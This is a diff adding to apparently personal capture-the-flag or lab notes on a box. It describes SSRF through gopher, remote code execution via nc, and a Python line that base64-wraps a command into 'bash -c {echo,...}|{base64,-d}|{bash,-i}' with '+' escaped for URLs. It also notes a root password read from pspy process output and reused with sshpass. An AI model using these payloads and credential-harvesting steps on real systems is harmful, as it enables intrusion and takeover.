@@ -91,3 +91,24 @@ O - port 9000 is rpc feed, read trash.pdf
           - 127.0.1.1:8983_solr
           - use gopher to emulate a post request:
             - https://programming.vip/docs/ssrf-uses-gopher-to-attack-mysql-and-intranet.html
+            - I get RCE... but only for nc <IP> <PORT>... i cant do anything else...
+            - bash$ client2.py;client3.py
+            - "no real feedback, more just a way to ensure that it gets translated across.  I could do simple, whoami just fine, but anything more complicated and it messed up.  So I base64 encoded it, but then also came across + in the base64 so I had to adjust for that"
+            O - cmd = 'bash -c {echo,' + base64.b64encode(command.encode('utf-8')).decode('utf-8') + '}|{base64,-d}|{bash,-i}'
+            O - cmd = cmd.replace('+', '%2b')
+              - NO SHIT.... '+' in a base 64 encoded payload will be interpreted as spaces if URL
+              - base 64 your payload and it works
+################################################################################
+ROOT
+################################################################################
+O - pspy64s
+  O - sshpass -p c413d115b3d87664499624e7826d8c5a scp /opt/updates/files/bug-feed root@172.18.0.2:/root/feeds/ 
+    O - sshpass -p c413d115b3d87664499624e7826d8c5a ssh root@172.18.0.2
+     X - there is an test rsa key at /tmp and it works? no
+      2020/09/05 18:19:01 CMD: UID=0    PID=62090  | scp /root/clear.sh root@172.18.0.2:/tmp/clear.sh                                       
+      2020/09/05 18:19:01 CMD: UID=0    PID=62089  | sshpass -p zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz scp /root/clear.sh root@172.18.0.2:/tmp/clear.sh 
+      2020/09/05 18:19:01 CMD: UID=0    PID=62091  | /usr/bin/ssh -x -oForwardAgent=no -oPermitLocalCommand=no -oClearAllForwardings=yes -oRemoteCommand=none -oRequestTTY=no -l root -- 172.18.0.2 scp -t /tmp/clear.sh 
+     O - socat https://medium.com/@copyconstruct/socat-29453e9fc8a6
+        
+
+
